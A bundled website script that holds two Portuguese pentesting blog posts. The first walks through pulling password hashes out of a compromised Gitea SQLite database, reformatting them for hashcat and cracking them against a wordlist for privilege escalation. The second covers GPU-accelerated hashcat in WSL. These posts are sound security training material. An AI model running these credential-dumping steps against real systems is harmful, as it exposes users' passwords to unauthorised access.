"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[4516],{1440:a=>{a.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"gitea_users_exfiltration","metadata":{"permalink":"/my-docs/blog/gitea_users_exfiltration","source":"@site/blog/gitea_users_exfiltration.mdx","title":"Extraindo Usu\xe1rios do Gitea","description":"Como extrair usu\xe1rios do Gitea DB e como quebr\xe1-los via brute force.","date":"2025-03-05T16:57:03.000Z","tags":[{"inline":true,"label":"gitea","permalink":"/my-docs/blog/tags/gitea"},{"inline":true,"label":"sqlite","permalink":"/my-docs/blog/tags/sqlite"},{"inline":true,"label":"hash","permalink":"/my-docs/blog/tags/hash"},{"inline":true,"label":"hashcat","permalink":"/my-docs/blog/tags/hashcat"},{"inline":true,"label":"privilege_escalation","permalink":"/my-docs/blog/tags/privilege-escalation"}],"readingTime":2.495,"hasTruncateMarker":true,"authors":[{"name":"Raphael Sander","title":"Senior DevSecOps","url":"https://github.com/raphaelsander","socials":{"github":"https://github.com/raphaelsander"},"imageURL":"https://github.com/raphaelsander.png","key":"raphaelsander","page":null}],"frontMatter":{"title":"Extraindo Usu\xe1rios do Gitea","description":"Como extrair usu\xe1rios do Gitea DB e como quebr\xe1-los via brute force.","slug":"gitea_users_exfiltration","authors":"raphaelsander","tags":["gitea","sqlite","hash","hashcat","privilege_escalation"],"hide_table_of_contents":false},"unlisted":false,"nextItem":{"title":"GPU CUDA no WSL","permalink":"/my-docs/blog/gpu_cuda_in_wsl"}},"content":"Quando ganhamos acesso a um *host* por\xe9m precisamos escalar privil\xe9gios e\\nconseguir acesso \xe0 autentica\xe7\xe3o de usu\xe1rio com permiss\xf5es mais elevadas pode ser\\num desafio. Nesse *post* irei mostrar como fazer a extra\xe7\xe3o e quebra dos\\nusu\xe1rios presentes no DB da aplica\xe7\xe3o Gitea, mas que pode n\xe3o se limitar apenas\\na este.\\n\\n\x3c!-- markdownlint-disable MD037 --\x3e\\n{/* truncate */}\\n\x3c!-- markdownlint-enable MD037 --\x3e\\n\\n## Localizando o Gitea DB\\n\\nA localiza\xe7\xe3o do banco de dados do Gitea em caso de ser Sqlite3, \xe9 definido no\\nsetup inicial ou via vari\xe1vel de ambiente caso conteinerizado.\\n\\n![gitea_db_setup](/img/blog/gitea_users_exfiltration/gitea_db_setup.png)\\n\\nEste \xe9 apenas um cen\xe1rio caso voc\xea tenha acesso a uma *shell* ou uma falha de\\nRCE no *host* alvo, caso contr\xe1rio ser\xe1 necess\xe1rio identificar a localiza\xe7\xe3o do\\narquivo e download de outra maneira.\\n\\n```bash\\nfind / -name gitea.db 2>/dev/null\\n# ou\\nfind / -name *.db 2>/dev/null\\n```\\n\\n## Extraindo o Hash do Usu\xe1rios\\n\\nAbaixo iremos extrair o usu\xe1rio da tabela `user` e formatar para que o *salt* e\\no *hash* fiquem no formato reconhecido pelo Hashcat.\\n\\n```bash\\nsqlite3 gitea.db \\"select passwd,salt,name from user\\" | \\\\\\n    while read data; do\\n        digest=$(echo \\"$data\\" | cut -d\'|\' -f1 | xxd -r -p | base64);\\n        salt=$(echo \\"$data\\" | cut -d\'|\' -f2 | xxd -r -p | base64);\\n        name=$(echo $data | cut -d\'|\' -f3);\\n        echo \\"${name}:sha256:50000:${salt}:${digest}\\";\\n    done | \\\\\\n    tee gitea.hashes\\n```\\n\\nResultado:\\n\\n```hash\\n# <user>:<algoritm>:<interaction_number>:<salt>:<digest>\\nadmin:sha256:50000:dgaKi9oBOPF7HkA4p4/dmQ==:sPxfp5JlXb0HURMg3Xwv9UmEQkYtRn+VZAbakCuPHwZRJfACimU+2t4yQVEoWo3wuss=\\n```\\n\\n`<user>`: Indica o nome ou identificador do usu\xe1rio.  \\n`<algoritm>`: Especifica o algoritmo de hash utilizado para transformar a senha\\nem uma sequ\xeancia fixa (neste caso, SHA-256).  \\n`<50000>`: Representa o n\xfamero de itera\xe7\xf5es que o algoritmo de hash \xe9 aplicado.\\nEssa repeti\xe7\xe3o torna o processo de c\xe1lculo mais lento, ajudando a dificultar\\nataques de for\xe7a bruta.  \\n`<salt>`: \xc9 um valor aleat\xf3rio adicionado \xe0 senha antes de aplicar o hash. O\\nsalt previne o uso de tabelas pr\xe9-calculadas (rainbow tables) e garante que\\nsenhas iguais n\xe3o resultem no mesmo hash.  \\n`<digest>`: \xc9 o resultado final (o hash) da senha combinada com o salt,\\nprocessada pelo algoritmo SHA-256 o n\xfamero especificado de vezes.\\n\\nNote que o salt e o digest precisam estar em *base64* porque para esse *hash* \xe9\\nsolicitado pelo Hashcat. Podemos ver isso com o argumento `--hash-info`:\\n\\n```bash\\nhashcat -m 10900 --hash-info\\n```\\n\\n![hash_info](/img/blog/gitea_users_exfiltration/hash_info.png)\\n\\nO n\xfamero de itera\xe7\xf5es pode ser diferente dependendo do `PASSWORD_HASH_ALGO`\\nutilizado durante o setup ou como vari\xe1vel de ambiente. Abaixo temos as op\xe7\xf5es\\nde `PASSWORD_HASH_ALGO`, note que no caso do `pbkdf2`, h\xe1 v\xe1rias itera\xe7\xf5es\\nposs\xedveis (10000, 50000 e 320000).\\n\\n```hash\\nargon2: argon2$2$65536$8$50\\nbcrypt: bcrypt$10\\npbkdf2: pbkdf2$50000$50\\npbkdf2_v1: pbkdf2$10000$50\\npbkdf2_v2: pbkdf2$50000$50\\npbkdf2_hi: pbkdf2$320000$50\\nscrypt: scrypt$65536$16$2$50\\n```\\n\\nIsso vai estar dispon\xedvel no pr\xf3prio banco de dados:\\n\\n```bash\\n$ sqlite3 gitea.db \\"select passwd_hash_algo from user\\"\\npbkdf2$50000$50\\n```\\n\\n## Quebra do Hash\\n\\nPara a quebra dos hashes utilizando o hashcat \xe9 bem simples e inclusive pode ser\\nomitido o argumento que indica do algor\xedtmo porque ser\xe1 automaticamente\\ndefinido.\\n\\n```bash\\nhashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user\\n```\\n\\n## Refer\xeancias\\n\\n\x3c!-- markdownlint-disable MD034 --\x3e\\n- https://hashcat.net/wiki/doku.php?id=example_hashes\\n- https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#crack-gitea-hash\\n- https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#cracking-gitea-hashes\\n- https://medium.com/@khaledkamal456/solving-htb-machine-titanic-easy-3fbf13560594\\n\x3c!-- markdownlint-enable MD034 --\x3e"},{"id":"gpu_cuda_in_wsl","metadata":{"permalink":"/my-docs/blog/gpu_cuda_in_wsl","source":"@site/blog/gpu-cuda-in-wsl.mdx","title":"GPU CUDA no WSL","description":"Como instalar os drivers CUDA no WSL para brute foce utilizando o Hashcat.","date":"2025-03-05T16:57:03.000Z","tags":[{"inline":true,"label":"hashcat","permalink":"/my-docs/blog/tags/hashcat"},{"inline":true,"label":"hash","permalink":"/my-docs/blog/tags/hash"},{"inline":true,"label":"wsl","permalink":"/my-docs/blog/tags/wsl"},{"inline":true,"label":"gpu","permalink":"/my-docs/blog/tags/gpu"}],"readingTime":1.055,"hasTruncateMarker":true,"authors":[{"name":"Raphael Sander","title":"Senior DevSecOps","url":"https://github.com/raphaelsander","socials":{"github":"https://github.com/raphaelsander"},"imageURL":"https://github.com/raphaelsander.png","key":"raphaelsander","page":null}],"frontMatter":{"title":"GPU CUDA no WSL","description":"Como instalar os drivers CUDA no WSL para brute foce utilizando o Hashcat.","slug":"gpu_cuda_in_wsl","authors":"raphaelsander","tags":["hashcat","hash","wsl","gpu"],"image":"/img/blog/gpu_cuda_in_wsl/wsl_plus_nvidia_cuda.png","hide_table_of_contents":false},"unlisted":false,"prevItem":{"title":"Extraindo Usu\xe1rios do Gitea","permalink":"/my-docs/blog/gitea_users_exfiltration"}},"content":"![wsl_plus_nvidia_cuda](/img/blog/gpu_cuda_in_wsl/wsl_plus_nvidia_cuda.png)\\n\\nDurante a execu\xe7\xe3o de pentests, \xe9 comum utilizar m\xe1quinas virtuais para\\nfacilitar a configura\xe7\xe3o e manuten\xe7\xe3o dos ambientes, permitindo a cria\xe7\xe3o de\\nsnapshots antes de altera\xe7\xf5es significativas; por\xe9m, a quebra de hashes nessas\\nVMs pode ser limitada pelo uso da CPU, e o aproveitamento da GPU exige\\npassthrough de uma placa de v\xeddeo adicional. Dessa forma, existem duas\\nalternativas: instalar a ferramenta diretamente no sistema operacional do host\\nou utilizar o WSL com acelera\xe7\xe3o GPU CUDA em placas Nvidia, mantendo o ambiente\\nde teste isolado.\\n\\n{/* truncate */}\\n\\n## Instala\xe7\xe3o\\n\\nEsse procedimento foi testado tanto no Kali Linux quanto no Ubuntu, sendo este\\n\xfaltimo o recomendado pela documenta\xe7\xe3o da Nvidia.\\n\\n```bash\\nwget https://developer.download.nvidia.com/compute/cuda/repos/wsl-ubuntu/x86_64/cuda-keyring_1.1-1_all.deb\\nsudo dpkg -i cuda-keyring_1.1-1_all.deb\\nsudo apt-get update\\nsudo apt-get -y install cuda-toolkit-12-8\\n```\\n\\n:::warning\\nO driver CUDA instalado no host do Windows ser\xe1 compartilhado dentro do WSL 2\\ncomo libcuda.so, portanto, os usu\xe1rios n\xe3o devem instalar nenhum driver NVIDIA\\nGPU Linux no WSL 2, pois o CUDA Toolkit padr\xe3o vem empacotado com um driver e \xe9\\nf\xe1cil substituir o driver WSL 2 NVIDIA pela instala\xe7\xe3o padr\xe3o.\\n:::\\n\\nAp\xf3s a instala\xe7\xe3o do driver no seu WSL voc\xea ser\xe1 capaz de utilizar o Hashcat,\\npor exemplo, com acelera\xe7\xe3o GPU CUDA:\\n\\n![kali_wsl_hashcat_info_devices](/img/blog/gpu_cuda_in_wsl/kali_wsl_hashcat_info_devices.png)\\n\\n## Refer\xeancias\\n\\n- [https://learn.microsoft.com/en-us/windows/ai/directml/gpu-cuda-in-wsl](https://learn.microsoft.com/en-us/windows/ai/directml/gpu-cuda-in-wsl)\\n- [https://docs.nvidia.com/cuda/wsl-user-guide/index.html#getting-started-with-cuda-on-wsl-2](https://docs.nvidia.com/cuda/wsl-user-guide/index.html#getting-started-with-cuda-on-wsl-2)\\n- [https://developer.nvidia.com/cuda-downloads?target_os=Linux&target_arch=x86_64&Distribution=WSL-Ubuntu&target_version=2.0&target_type=deb_network](https://developer.nvidia.com/cuda-downloads?target_os=Linux&target_arch=x86_64&Distribution=WSL-Ubuntu&target_version=2.0&target_type=deb_network)"}]}}')}}]);